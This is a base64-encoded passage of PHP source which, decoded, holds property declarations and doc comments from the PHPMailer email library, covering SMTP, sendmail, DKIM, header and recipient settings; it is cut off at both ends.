woKICAgIC8qKgogICAgICogVGhlIHBsYWluLXRleHQgbWVzc2FnZSBib2R5LgogICAgICogVGhpcyBib2R5IGNhbiBiZSByZWFkIGJ5IG1haWwgY2xpZW50cyB0aGF0IGRvIG5vdCBoYXZlIEhUTUwgZW1haWwKICAgICAqIGNhcGFiaWxpdHkgc3VjaCBhcyBtdXR0ICYgRXVkb3JhLgogICAgICogQ2xpZW50cyB0aGF0IGNhbiByZWFkIEhUTUwgd2lsbCB2aWV3IHRoZSBub3JtYWwgQm9keS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkQWx0Qm9keSA9ICcnOwoKICAgIC8qKgogICAgICogQW4gaUNhbCBtZXNzYWdlIHBhcnQgYm9keS4KICAgICAqIE9ubHkgc3VwcG9ydGVkIGluIHNpbXBsZSBhbHQgb3IgYWx0X2lubGluZSBtZXNzYWdlIHR5cGVzCiAgICAgKiBUbyBnZW5lcmF0ZSBpQ2FsIGV2ZW50cywgdXNlIHRoZSBidW5kbGVkIGV4dHJhcy9FYXN5UGVhc3lJQ1MucGhwIGNsYXNzIG9yIGlDYWxjcmVhdG9yCiAgICAgKiBAbGluayBodHRwOi8vc3ByYWluLmNoL2Jsb2cvZG93bmxvYWRzL3BocC1jbGFzcy1lYXN5cGVhc3lpY3MtY3JlYXRlLWljYWwtZmlsZXMtd2l0aC1waHAvCiAgICAgKiBAbGluayBodHRwOi8va2lna29uc3VsdC5zZS9pQ2FsY3JlYXRvci8KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkSWNhbCA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIGNvbXBsZXRlIGNvbXBpbGVkIE1JTUUgbWVzc2FnZSBib2R5LgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCAkTUlNRUJvZHkgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBjb21wbGV0ZSBjb21waWxlZCBNSU1FIG1lc3NhZ2UgaGVhZGVycy4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJE1JTUVIZWFkZXIgPSAnJzsKCiAgICAvKioKICAgICAqIEV4dHJhIGhlYWRlcnMgdGhhdCBjcmVhdGVIZWFkZXIoKSBkb2Vzbid0IGZvbGQgaW4uCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRtYWlsSGVhZGVyID0gJyc7CgogICAgLyoqCiAgICAgKiBXb3JkLXdyYXAgdGhlIG1lc3NhZ2UgYm9keSB0byB0aGlzIG51bWJlciBvZiBjaGFycy4KICAgICAqIFNldCB0byAwIHRvIG5vdCB3cmFwLiBBIHVzZWZ1bCB2YWx1ZSBoZXJlIGlzIDc4LCBmb3IgUkZDMjgyMiBzZWN0aW9uIDIuMS4xIGNvbXBsaWFuY2UuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqLwogICAgcHVibGljICRXb3JkV3JhcCA9IDA7CgogICAgLyoqCiAgICAgKiBXaGljaCBtZXRob2QgdG8gdXNlIHRvIHNlbmQgbWFpbC4KICAgICAqIE9wdGlvbnM6ICJtYWlsIiwgInNlbmRtYWlsIiwgb3IgInNtdHAiLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRNYWlsZXIgPSAnbWFpbCc7CgogICAgLyoqCiAgICAgKiBUaGUgcGF0aCB0byB0aGUgc2VuZG1haWwgcHJvZ3JhbS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkU2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgbWFpbCgpIHVzZXMgYSBmdWxseSBzZW5kbWFpbC1jb21wYXRpYmxlIE1UQS4KICAgICAqIE9uZSB3aGljaCBzdXBwb3J0cyBzZW5kbWFpbCdzICItb2kgLWYiIG9wdGlvbnMuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljICRVc2VTZW5kbWFpbE9wdGlvbnMgPSB0cnVlOwoKICAgIC8qKgogICAgICogUGF0aCB0byBQSFBNYWlsZXIgcGx1Z2lucy4KICAgICAqIFVzZWZ1bCBpZiB0aGUgU01UUCBjbGFzcyBpcyBub3QgaW4gdGhlIFBIUCBpbmNsdWRlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGRlcHJlY2F0ZWQgU2hvdWxkIG5vdCBiZSBuZWVkZWQgbm93IHRoZXJlIGlzIGFuIGF1dG9sb2FkZXIuCiAgICAgKi8KICAgIHB1YmxpYyAkUGx1Z2luRGlyID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgZW1haWwgYWRkcmVzcyB0aGF0IGEgcmVhZGluZyBjb25maXJtYXRpb24gc2hvdWxkIGJlIHNlbnQgdG8sIGFsc28ga25vd24gYXMgcmVhZCByZWNlaXB0LgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRDb25maXJtUmVhZGluZ1RvID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgaG9zdG5hbWUgdG8gdXNlIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBhbmQgYXMgZGVmYXVsdCBIRUxPIHN0cmluZy4KICAgICAqIElmIGVtcHR5LCBQSFBNYWlsZXIgYXR0ZW1wdHMgdG8gZmluZCBvbmUgd2l0aCwgaW4gb3JkZXIsCiAgICAgKiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwgZ2V0aG9zdG5hbWUoKSwgcGhwX3VuYW1lKCduJyksIG9yIHRoZSB2YWx1ZQogICAgICogJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJEhvc3RuYW1lID0gJyc7CgogICAgLyoqCiAgICAgKiBBbiBJRCB0byBiZSB1c2VkIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlci4KICAgICAqIElmIGVtcHR5LCBhIHVuaXF1ZSBpZCB3aWxsIGJlIGdlbmVyYXRlZC4KICAgICAqIFlvdSBjYW4gc2V0IHlvdXIgb3duLCBidXQgaXQgbXVzdCBiZSBpbiB0aGUgZm9ybWF0ICI8aWRAZG9tYWluPiIsCiAgICAgKiBhcyBkZWZpbmVkIGluIFJGQzUzMjIgc2VjdGlvbiAzLjYuNCBvciBpdCB3aWxsIGJlIGlnbm9yZWQuCiAgICAgKiBAc2VlIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM1MzIyI3NlY3Rpb24tMy42LjQKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkTWVzc2FnZUlEID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgbWVzc2FnZSBEYXRlIHRvIGJlIHVzZWQgaW4gdGhlIERhdGUgaGVhZGVyLgogICAgICogSWYgZW1wdHksIHRoZSBjdXJyZW50IGRhdGUgd2lsbCBiZSBhZGRlZC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkTWVzc2FnZURhdGUgPSAnJzsKCiAgICAvKioKICAgICAqIFNNVFAgaG9zdHMuCiAgICAgKiBFaXRoZXIgYSBzaW5nbGUgaG9zdG5hbWUgb3IgbXVsdGlwbGUgc2VtaWNvbG9uLWRlbGltaXRlZCBob3N0bmFtZXMuCiAgICAgKiBZb3UgY2FuIGFsc28gc3BlY2lmeSBhIGRpZmZlcmVudCBwb3J0CiAgICAgKiBmb3IgZWFjaCBob3N0IGJ5IHVzaW5nIHRoaXMgZm9ybWF0OiBbaG9zdG5hbWU6cG9ydF0KICAgICAqIChlLmcuICJzbXRwMS5leGFtcGxlLmNvbToyNTtzbXRwMi5leGFtcGxlLmNvbSIpLgogICAgICogWW91IGNhbiBhbHNvIHNwZWNpZnkgZW5jcnlwdGlvbiB0eXBlLCBmb3IgZXhhbXBsZToKICAgICAqIChlLmcuICJ0bHM6Ly9zbXRwMS5leGFtcGxlLmNvbTo1ODc7c3NsOi8vc210cDIuZXhhbXBsZS5jb206NDY1IikuCiAgICAgKiBIb3N0cyB3aWxsIGJlIHRyaWVkIGluIG9yZGVyLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRIb3N0ID0gJ2xvY2FsaG9zdCc7CgogICAgLyoqCiAgICAgKiBUaGUgZGVmYXVsdCBTTVRQIHNlcnZlciBwb3J0LgogICAgICogQHZhciBpbnRlZ2VyCiAgICAgKiBAVE9ETyBXaHkgaXMgdGhpcyBuZWVkZWQgd2hlbiB0aGUgU01UUCBjbGFzcyB0YWtlcyBjYXJlIG9mIGl0PwogICAgICovCiAgICBwdWJsaWMgJFBvcnQgPSAyNTsKCiAgICAvKioKICAgICAqIFRoZSBTTVRQIEhFTE8gb2YgdGhlIG1lc3NhZ2UuCiAgICAgKiBEZWZhdWx0IGlzICRIb3N0bmFtZS4gSWYgJEhvc3RuYW1lIGlzIGVtcHR5LCBQSFBNYWlsZXIgYXR0ZW1wdHMgdG8gZmluZAogICAgICogb25lIHdpdGggdGhlIHNhbWUgbWV0aG9kIGRlc2NyaWJlZCBhYm92ZSBmb3IgJEhvc3RuYW1lLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokSG9zdG5hbWUKICAgICAqLwogICAgcHVibGljICRIZWxvID0gJyc7CgogICAgLyoqCiAgICAgKiBXaGF0IGtpbmQgb2YgZW5jcnlwdGlvbiB0byB1c2Ugb24gdGhlIFNNVFAgY29ubmVjdGlvbi4KICAgICAqIE9wdGlvbnM6ICcnLCAnc3NsJyBvciAndGxzJwogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRTTVRQU2VjdXJlID0gJyc7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGVuYWJsZSBUTFMgZW5jcnlwdGlvbiBhdXRvbWF0aWNhbGx5IGlmIGEgc2VydmVyIHN1cHBvcnRzIGl0LAogICAgICogZXZlbiBpZiBgU01UUFNlY3VyZWAgaXMgbm90IHNldCB0byAndGxzJy4KICAgICAqIEJlIGF3YXJlIHRoYXQgaW4gUEhQID49IDUuNiB0aGlzIHJlcXVpcmVzIHRoYXQgdGhlIHNlcnZlcidzIGNlcnRpZmljYXRlcyBhcmUgdmFsaWQuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljICRTTVRQQXV0b1RMUyA9IHRydWU7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIHVzZSBTTVRQIGF1dGhlbnRpY2F0aW9uLgogICAgICogVXNlcyB0aGUgVXNlcm5hbWUgYW5kIFBhc3N3b3JkIHByb3BlcnRpZXMuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqIEBzZWUgUEhQTWFpbGVyOjokVXNlcm5hbWUKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokUGFzc3dvcmQKICAgICAqLwogICAgcHVibGljICRTTVRQQXV0aCA9IGZhbHNlOwoKICAgIC8qKgogICAgICogT3B0aW9ucyBhcnJheSBwYXNzZWQgdG8gc3RyZWFtX2NvbnRleHRfY3JlYXRlIHdoZW4gY29ubmVjdGluZyB2aWEgU01UUC4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHVibGljICRTTVRQT3B0aW9ucyA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBTTVRQIHVzZXJuYW1lLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRVc2VybmFtZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCBwYXNzd29yZC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkUGFzc3dvcmQgPSAnJzsKCiAgICAvKioKICAgICAqIFNNVFAgYXV0aCB0eXBlLgogICAgICogT3B0aW9ucyBhcmUgQ1JBTS1NRDUsIExPR0lOLCBQTEFJTiwgTlRMTSwgWE9BVVRIMiwgYXR0ZW1wdGVkIGluIHRoYXQgb3JkZXIgaWYgbm90IHNwZWNpZmllZAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRBdXRoVHlwZSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCByZWFsbS4KICAgICAqIFVzZWQgZm9yIE5UTE0gYXV0aAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRSZWFsbSA9ICcnOwoKICAgIC8qKgogICAgICogU01UUCB3b3Jrc3RhdGlvbi4KICAgICAqIFVzZWQgZm9yIE5UTE0gYXV0aAogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRXb3Jrc3RhdGlvbiA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFNNVFAgc2VydmVyIHRpbWVvdXQgaW4gc2Vjb25kcy4KICAgICAqIERlZmF1bHQgb2YgNSBtaW51dGVzICgzMDBzZWMpIGlzIGZyb20gUkZDMjgyMSBzZWN0aW9uIDQuNS4zLjIKICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgJFRpbWVvdXQgPSAzMDA7CgogICAgLyoqCiAgICAgKiBTTVRQIGNsYXNzIGRlYnVnIG91dHB1dCBtb2RlLgogICAgICogRGVidWcgb3V0cHV0IGxldmVsLgogICAgICogT3B0aW9uczoKICAgICAqICogYDBgIE5vIG91dHB1dAogICAgICogKiBgMWAgQ29tbWFuZHMKICAgICAqICogYDJgIERhdGEgYW5kIGNvbW1hbmRzCiAgICAgKiAqIGAzYCBBcyAyIHBsdXMgY29ubmVjdGlvbiBzdGF0dXMKICAgICAqICogYDRgIExvdy1sZXZlbCBkYXRhIG91dHB1dAogICAgICogQHZhciBpbnRlZ2VyCiAgICAgKiBAc2VlIFNNVFA6OiRkb19kZWJ1ZwogICAgICovCiAgICBwdWJsaWMgJFNNVFBEZWJ1ZyA9IDA7CgogICAgLyoqCiAgICAgKiBIb3cgdG8gaGFuZGxlIGRlYnVnIG91dHB1dC4KICAgICAqIE9wdGlvbnM6CiAgICAgKiAqIGBlY2hvYCBPdXRwdXQgcGxhaW4tdGV4dCBhcy1pcywgYXBwcm9wcmlhdGUgZm9yIENMSQogICAgICogKiBgaHRtbGAgT3V0cHV0IGVzY2FwZWQsIGxpbmUgYnJlYWtzIGNvbnZlcnRlZCB0byBgPGJyPmAsIGFwcHJvcHJpYXRlIGZvciBicm93c2VyIG91dHB1dAogICAgICogKiBgZXJyb3JfbG9nYCBPdXRwdXQgdG8gZXJyb3IgbG9nIGFzIGNvbmZpZ3VyZWQgaW4gcGhwLmluaQogICAgICoKICAgICAqIEFsdGVybmF0aXZlbHksIHlvdSBjYW4gcHJvdmlkZSBhIGNhbGxhYmxlIGV4cGVjdGluZyB0d28gcGFyYW1zOiBhIG1lc3NhZ2Ugc3RyaW5nIGFuZCB0aGUgZGVidWcgbGV2ZWw6CiAgICAgKiA8Y29kZT4KICAgICAqICRtYWlsLT5EZWJ1Z291dHB1dCA9IGZ1bmN0aW9uKCRzdHIsICRsZXZlbCkge2VjaG8gImRlYnVnIGxldmVsICRsZXZlbDsgbWVzc2FnZTogJHN0ciI7fTsKICAgICAqIDwvY29kZT4KICAgICAqIEB2YXIgc3RyaW5nfGNhbGxhYmxlCiAgICAgKiBAc2VlIFNNVFA6OiREZWJ1Z291dHB1dAogICAgICovCiAgICBwdWJsaWMgJERlYnVnb3V0cHV0ID0gJ2VjaG8nOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byBrZWVwIFNNVFAgY29ubmVjdGlvbiBvcGVuIGFmdGVyIGVhY2ggbWVzc2FnZS4KICAgICAqIElmIHRoaXMgaXMgc2V0IHRvIHRydWUgdGhlbiB0byBjbG9zZSB0aGUgY29ubmVjdGlvbgogICAgICogcmVxdWlyZXMgYW4gZXhwbGljaXQgY2FsbCB0byBzbXRwQ2xvc2UoKS4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJFNNVFBLZWVwQWxpdmUgPSBmYWxzZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gc3BsaXQgbXVsdGlwbGUgdG8gYWRkcmVzc2VzIGludG8gbXVsdGlwbGUgbWVzc2FnZXMKICAgICAqIG9yIHNlbmQgdGhlbSBhbGwgaW4gb25lIG1lc3NhZ2UuCiAgICAgKiBPbmx5IHN1cHBvcnRlZCBpbiBgbWFpbGAgYW5kIGBzZW5kbWFpbGAgdHJhbnNwb3J0cywgbm90IGluIFNNVFAuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljICRTaW5nbGVUbyA9IGZhbHNlOwoKICAgIC8qKgogICAgICogU3RvcmFnZSBmb3IgYWRkcmVzc2VzIHdoZW4gU2luZ2xlVG8gaXMgZW5hYmxlZC4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBUT0RPIFRoaXMgc2hvdWxkIHJlYWxseSBub3QgYmUgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyAkU2luZ2xlVG9BcnJheSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGdlbmVyYXRlIFZFUlAgYWRkcmVzc2VzIG9uIHNlbmQuCiAgICAgKiBPbmx5IGFwcGxpY2FibGUgd2hlbiBzZW5kaW5nIHZpYSBTTVRQLgogICAgICogQGxpbmsgaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVmFyaWFibGVfZW52ZWxvcGVfcmV0dXJuX3BhdGgKICAgICAqIEBsaW5rIGh0dHA6Ly93d3cucG9zdGZpeC5vcmcvVkVSUF9SRUFETUUuaHRtbCBQb3N0Zml4IFZFUlAgaW5mbwogICAgICogQHZhciBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyAkZG9fdmVycCA9IGZhbHNlOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byBhbGxvdyBzZW5kaW5nIG1lc3NhZ2VzIHdpdGggYW4gZW1wdHkgYm9keS4KICAgICAqIEB2YXIgYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgJEFsbG93RW1wdHkgPSBmYWxzZTsKCiAgICAvKioKICAgICAqIFRoZSBkZWZhdWx0IGxpbmUgZW5kaW5nLgogICAgICogQG5vdGUgVGhlIGRlZmF1bHQgcmVtYWlucyAiXG4iLiBXZSBmb3JjZSBDUkxGIHdoZXJlIHdlIGtub3cKICAgICAqICAgICAgICBpdCBtdXN0IGJlIHVzZWQgdmlhIHNlbGY6OkNSTEYuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJExFID0gIlxuIjsKCiAgICAvKioKICAgICAqIERLSU0gc2VsZWN0b3IuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fc2VsZWN0b3IgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gSWRlbnRpdHkuCiAgICAgKiBVc3VhbGx5IHRoZSBlbWFpbCBhZGRyZXNzIHVzZWQgYXMgdGhlIHNvdXJjZSBvZiB0aGUgZW1haWwuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1faWRlbnRpdHkgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcGFzc3BocmFzZS4KICAgICAqIFVzZWQgaWYgeW91ciBrZXkgaXMgZW5jcnlwdGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3Bhc3NwaHJhc2UgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gc2lnbmluZyBkb21haW4gbmFtZS4KICAgICAqIEBleGFtcGxlICdleGFtcGxlLmNvbScKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9kb21haW4gPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgZmlsZSBwYXRoLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3ByaXZhdGUgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgc3RyaW5nLgogICAgICogSWYgc2V0LCB0YWtlcyBwcmVjZWRlbmNlIG92ZXIgYCRES0lNX3ByaXZhdGVgLgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3ByaXZhdGVfc3RyaW5nID0gJyc7CgogICAgLyoqCiAgICAgKiBDYWxsYmFjayBBY3Rpb24gZnVuY3Rpb24gbmFtZS4KICAgICAqCiAgICAgKiBUaGUgZnVuY3Rpb24gdGhhdCBoYW5kbGVzIHRoZSByZXN1bHQgb2YgdGhlIHNlbmQgZW1haWwgYWN0aW9uLgogICAgICogSXQgaXMgY2FsbGVkIG91dCBieSBzZW5kKCkgZm9yIGVhY2ggZW1haWwgc2VudC4KICAgICAqCiAgICAgKiBWYWx1ZSBjYW4gYmUgYW55IHBocCBjYWxsYWJsZTogaHR0cDovL3d3dy5waHAubmV0L2lzX2NhbGxhYmxlCiAgICAgKgogICAgICogUGFyYW1ldGVyczoKICAgICAqICAgYm9vbGVhbiAkcmVzdWx0ICAgICAgICByZXN1bHQgb2YgdGhlIHNlbmQgYWN0aW9uCiAgICAgKiAgIGFycmF5ICAgJHRvICAgICAgICAgICAgZW1haWwgYWRkcmVzc2VzIG9mIHRoZSByZWNpcGllbnRzCiAgICAgKiAgIGFycmF5ICAgJGNjICAgICAgICAgICAgY2MgZW1haWwgYWRkcmVzc2VzCiAgICAgKiAgIGFycmF5ICAgJGJjYyAgICAgICAgICAgYmNjIGVtYWlsIGFkZHJlc3NlcwogICAgICogICBzdHJpbmcgICRzdWJqZWN0ICAgICAgIHRoZSBzdWJqZWN0CiAgICAgKiAgIHN0cmluZyAgJGJvZHkgICAgICAgICAgdGhlIGVtYWlsIGJvZHkKICAgICAqICAgc3RyaW5nICAkZnJvbSAgICAgICAgICBlbWFpbCBhZGRyZXNzIG9mIHNlbmRlcgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRhY3Rpb25fZnVuY3Rpb24gPSAnJzsKCiAgICAvKioKICAgICAqIFdoYXQgdG8gcHV0IGluIHRoZSBYLU1haWxlciBoZWFkZXIuCiAgICAgKiBPcHRpb25zOiBBbiBlbXB0eSBzdHJpbmcgZm9yIFBIUE1haWxlciBkZWZhdWx0LCB3aGl0ZXNwYWNlIGZvciBub25lLCBvciBhIHN0cmluZyB0byB1c2UKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyAkWE1haWxlciA9ICcgJzsKCiAgICAvKioKICAgICAqIFdoaWNoIHZhbGlkYXRvciB0byB1c2UgYnkgZGVmYXVsdCB3aGVuIHZhbGlkYXRpbmcgZW1haWwgYWRkcmVzc2VzLgogICAgICogTWF5IGJlIGEgY2FsbGFibGUgdG8gaW5qZWN0IHlvdXIgb3duIHZhbGlkYXRvciwgYnV0IHRoZXJlIGFyZSBzZXZlcmFsIGJ1aWx0LWluIHZhbGlkYXRvcnMuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6dmFsaWRhdGVBZGRyZXNzKCkKICAgICAqIEB2YXIgc3RyaW5nfGNhbGxhYmxlCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgJHZhbGlkYXRvciA9ICdhdXRvJzsKCiAgICAvKioKICAgICAqIEFuIGluc3RhbmNlIG9mIHRoZSBTTVRQIHNlbmRlciBjbGFzcy4KICAgICAqIEB2YXIgU01UUAogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzbXRwID0gbnVsbDsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAndG8nIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHRvID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnY2MnIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGNjID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnYmNjJyBuYW1lcyBhbmQgYWRkcmVzc2VzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRiY2MgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIHJlcGx5LXRvIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG8gPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgYWxsIGtpbmRzIG9mIGFkZHJlc3Nlcy4KICAgICAqIEluY2x1ZGVzIGFsbCBvZiAkdG8sICRjYywgJGJjYwogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICovCiAgICBwcm90ZWN0ZWQgJGFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsKCiAgICAvKioKICAgICAqIEFuIGFycmF5IG9mIG5hbWVzIGFuZCBhZGRyZXNzZXMgcXVldWVkIGZvciB2YWxpZGF0aW9uLgogICAgICogSW4gc2VuZCgpLCB2YWxpZCBhbmQgbm9uIGR1cGxpY2F0ZSBlbnRyaWVzIGFyZSBtb3ZlZCB0byAkYWxsX3JlY2lwaWVudHMKICAgICAqIGFuZCBvbmUgb2YgJHRvLCAkY2MsIG9yICRiY2MuCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRhbGxfcmVjaXBpZW50cwogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBBbiBhcnJheSBvZiByZXBseS10byBuYW1lcyBhbmQgYWRkcmVzc2VzIHF1ZXVlZCBmb3IgdmFsaWRhdGlvbi4KICAgICAqIEluIHNlbmQoKSwgdmFsaWQgYW5kIG5vbiBkdXBsaWNhdGUgZW50cmllcyBhcmUgbW92ZWQgdG8gJFJlcGx5VG8uCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokUmVwbHlUbwogICAgICovCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG9RdWV1ZSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXR0YWNobWVudHMuCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGF0dGFjaG1lbnQgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIGN1c3RvbSBoZWFkZXJzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIG1vc3QgcmVjZW50IE1lc3NhZ2UtSUQgKGluY2x1ZGluZyBhbmd1bGFyIGJyYWNrZXRzKS4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJGxhc3RNZXNzYWdlSUQgPSAnJzsKCiAgICAvKioKICAgICAqIFRoZSBtZXNzYWdlJ3MgTUlNRSB0eXBlLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbWVzc2FnZV90eXBlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgTUlNRSBib3VuZGFyeSBzdHJpbmdzLgogICAgICogQHZhciBhcnJheQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRib3VuZGFyeSA9IGFycmF5KCk7CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgYXZhaWxhYmxlIGxhbmd1